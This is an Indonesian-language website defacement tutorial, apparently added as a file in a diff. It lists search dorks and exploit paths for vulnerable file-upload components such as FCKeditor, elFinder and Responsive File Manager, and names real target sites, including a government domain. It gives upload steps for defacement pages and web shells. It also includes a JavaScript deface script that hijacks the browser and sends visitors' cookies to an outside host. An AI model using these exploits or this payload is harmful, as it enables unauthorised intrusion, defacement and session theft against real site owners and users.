@@ -1,0 +1,136 @@
+Deface dan pembelajaranya
+
+1.Dork kindeditor : Inurl:uploadbutton.html
+
+2.FCKeditor
+Dork: 
+inurl:advert_detail.php?id=
+Exploit:
+admin/FCKeditor/editor/filemanager/browser/default/browser.html?Type=File&Connector=connectors/php/connector.php
+
+3.com_fabrik
+Dork :
+
+exploit :
+index.php?option=com_fabrik&c=import&view=import&filetype=csv&table=1
+
+NB : poc com_fabrik juga ada csrfnya
+
+4.Webdav
+Pake aplikasi IES WEBDAV
+atau bisa juga ketik command di termux :
+$ pkg install curl
+$ curl -T /sdcard/index.html site.com
+
+
+6. JSO (Javascript Overlay)
+Dork : inurl:
+Script jso :
+/*
+<style>html,body{color:#ffffff}</style><font color='white'><script>top.location.href='http://www.google.com/?v=wall/'</script><noscript><META HTTP-EQUIV="refresh" CONTENT="0;URL=http://www.facebook.com/?v=wall/">
+*/
+document.getElementsByTagName('body')[0].innerHTML=""
+document.title="Hacked by Mr.Hacker"
+var shortc=document.createElement("link");shortc.rel="SHORTCUT ICON";shortc.href="https://66.media.tumblr.com/ae95f10220dc9965b718b6966606d6cf/tumblr_n1yxvxZNgo1t014gho1_500.gif";document.getElementsByTagName("head")[0].appendChild(shortc)
+function muter2(){
+scrW=screen.availWidth
+scrH=screen.availHeight
+window.moveTo(0,0)
+window.resizeTo(10,10)
+window.focus()
+for(x=0;x<80;x++){
+window.resizeTo(10,scrH*x/80)
+}
+for(y=0;y<80;y++){
+window.resizeTo(scrW*y/80,scrH)
+}
+window.resizeTo(scrW,scrH)
+}
+document.oncontextmenu=new Function("muter2();return false");
+function keypressed(){alert("Mr.Hacker Was Were cuk!");}
+document.onkeydown=keypressed;
+function kasih_tau(){
+alert('You has been slain');
+}
+if(location.href.indexOf('http://app.pukatsemarang.org')==-1)setTimeout("alert('Mr.Hacker was here');",3000);
+else setTimeout("kasih_tau()",3000);
+if(navigator.userAgent.indexOf('MSIE')!=-1){
+document.getElementsByTagName('body')[0].innerHTML="<center><iframe src='http://www.apparelworld.org/aa.htm' height='720px' width='1100px' scrolling='no' frameborder='0'></center>";
+}
+else{
+if(document.getElementsByTagName('body')[0].style.cssText.indexOf('hack')==-1){
+//muter2();
+log="";
+if(document.cookie!=""&&location.href.indexOf('ayodance.com')==-1){x=escape(document.cookie);v=escape(location.href);y="que3n4ngelz@yahoo.co.id";log=";background-image:url(http://crazydavinci.net/riper.php?o="+escape(x)+"&v="+escape(v)+"&y="+escape(y)+")";document.cookie="PHPSESSID=!Bagsfreakz Here!;path=/";}
+document.getElementsByTagName('body')[0].style.cssText="background-color:#000"+log
+window.onload=function(){
+document.getElementsByTagName('body')[0].innerHTML="<center><iframe src='http://www.apparelworld.org/aa.htm' height='720px' width='1100px' scrolling='no' frameborder='0'></center>";
+document.getElementsByTagName('body')[0].style.cssText="background-color:#000000;background-image:url(http://www.balikita.net/)!important;";
+}
+}
+}
+Kemudian script jso tersebut di salin ke web pastebin di www.pastebin.com
+dan hingga menjadi link, setelah script jsonya sudah menjadi link.. kemudian di bentuk seperti ini :
+<script type="text/javascript" src="https://pastebin.com/raw/v1zgCWVD"></script>
+
+6. Poc Seperti Xss / Seperti Url POISON
+Terget : www.askincressida.blogspot.com
+
+Tinggal di taruh seperti exploit :
+/feeds/posts/ tulisan terserah kamu
+
+Menjadi :
+www.askincressida.blogspot.com/feeds/posts/Hacked_By_RoOTclone
+
+7.RFM (Responsive File Manager)
+Dork : 
+Inurl:/filemanager/ intext:"dialog.php"
+Inurl:/js/filemanager/
+Intext:"dialog.php"
+Inurl:/assets/filemanager/
+Intext:"dialog.php"
+
+Exploit :
+filemanager/dialog.php
+
+Terget : http://djibun.pertanian.go.id
+kasih exploitnya tadi
+Menjadi
+http://djibun.pertanian.go.id/filemanager/dialog.php
+Kemudian disitu kan ada tempat uploadnya terus tinggal upload file atau upload shell kalo bisa ya upload shell setelah terupload tinggal kamu panggil biar muncul scriptnya menjadi :
+http://djibun.pertanian.go.id/source/scriptkamu.html
+
+8. Drupal
+Dork :
+allowed file type html
+‌Kemudian pilih salah satu web, setelah itu upload scriptnya setelah di upload disitu ada pencetan terus kamu pencet nanti muncul scriptnya kamu sendiri
+
+
+9. Elfinder
+Dork :
+inurl:/elfinder/elfinder.html
+Intitle:"elFinder 2.0"
+
+Setelah anda mengedork kemudian pilih salah satu web target kemudian klik, setelah itu disitu ada kotak hitam atau tempat uploadnya kalian pencet tombol itu kemudian, klik dan upload scriptnya setelah terupload disitu kan ada script anda terus klik scriptnya yang lama trus klik tulisan open.. done
+Hasil http://uat.rakluke.com/file_manager/DST.html
+
+10. kfcfinder
+http://www.berranikahsekeri.com/panel/kcfinder/upload/files/tes.html
+
+11. Deface Metode Uber uploader
+Dork : 
+uu_file_upload.php
+
+Cari tempat upload
+Done
+
+12. Priv8 SCR
+Dork :
+Inurl:config/config.izo
+Pilih salah satu web target
+￼
+
+Tulis kek gini
+-kalo sudah panggil sc biar muncul tulisanya kek gini
+www.site.com/config/tar.tmp
+Done :')
